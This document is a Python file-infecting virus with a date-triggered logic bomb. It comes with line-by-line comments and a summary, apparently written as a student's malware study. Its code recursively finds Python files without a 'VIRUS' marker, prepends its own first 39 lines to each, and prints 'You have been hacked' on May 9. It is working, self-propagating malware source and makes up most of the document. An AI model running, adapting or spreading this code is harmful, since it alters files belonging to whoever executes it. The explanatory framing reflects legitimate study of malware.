#!/usr/bin/python3

import os
import datetime

SIGNATURE = "VIRUS"

# This is a recursive function that locates all python files in the given path that are not infected.
# It then returns a list of non infected python files.
def locate(path):
    files_targeted = [] # This line of code creates a list to store non-infected python files
    filelist = os.listdir(path) # This line of code lists all files and directories in the given path
    for fname in filelist:
        if os.path.isdir(path+"/"+fname): # This line of code checks if the itme is a directory
            files_targeted.extend(locate(path+"/"+fname)) # This line of code recursively calls the location of subdirectories
        elif fname[-3:] == ".py": # This line of code checks if the file has a .py extension
            infected = False # This line of code flags a file to track if the file is infected
            for line in open(path+"/"+fname): # This line of code reads each line of the file
                if SIGNATURE in line: # This line of code chechks if the virus signature is present in any line
                    infected = True # This line of code flags to true if the signature is found.
                    break
            if infected == False: # This line of code adds a file to the list if not infected.
                files_targeted.append(path+"/"+fname)
    return files_targeted
  
# This fuction infects python files listed in files_targeted.
# Inserts the virus code at the beginning of each target file.
def infect(files_targeted):
    virus = open(os.path.abspath(__file__)) # This line of code opens the virus script file
    virusstring = "" 
    for i,line in enumerate(virus):
        if 0 <= i < 39: # This line of code captures the first 39 lines of the virus script
            virusstring += line
    virus.close # This line of code closes the virus script file
    for fname in files_targeted:
        f = open(fname) # This line of code opens the target python file
        temp = f.read() # This line of code reads the content of the target file.
        f.close() # This line of code closes the target file
        f = open(fname,"w") # This line of code opens the target file in write mode
        f.write(virusstring + temp) # This line of code writes the  virus code followed by the content is already had
        f.close()

# This function checks the current date and prints a message if its May 9th.
def detonate():
    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:
        print("You have been hacked")

# This locates non-infected python files in the current directory and its subdirectories
files_targeted = locate(os.path.abspath(""))
# This code infects the located files with the virus
infect(files_targeted)
# This detonates the virus by checking the date and printing a message.
detonate()


# Summery of this code
# This script malware wise can be catogorized as a logic bomb or a file infecting virus. 
# The script searches for python files, checks if they are infected and if not, it injects a predefined virus code
# at the beginning of the files. the detonate function adds a time triggered payload, hence it being a logic bomb, once detonated it prints a message on May 9th.
# while we do not know why May 9th was choosen, attackers may choose dates based on personal motivations, abiversaries, and historical events
# The code uses the following tools:
# 1. File I/O: since it uses key words such as  'open','read, 'write', and 'close'
# 2. Recursion: the code utilized the locate function for recursive search through directories
# 3. Datetime module: the date time module is used
# 4. Conditions and loops
# 5. Lists: uses a file_targeted variable. 
